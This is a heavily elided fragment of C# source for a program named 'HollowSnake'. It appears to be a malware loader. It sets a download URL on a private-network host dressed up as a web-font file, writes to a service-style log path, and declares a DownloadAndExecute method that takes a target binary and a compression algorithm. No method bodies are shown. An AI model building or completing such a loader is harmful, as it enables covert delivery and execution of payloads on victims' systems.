...
namespace HollowSnake
{
    public class Program
    {
        ...
        {
            /// Vars ///
            string url = "http://192.168.211.128/css/fonts/fontawesome.woff";
        ...
        public void WriteToFile(string Message)
        {
            ...
            string filepath = "c:\\User\\Public\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
        ...
        static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm)
        {
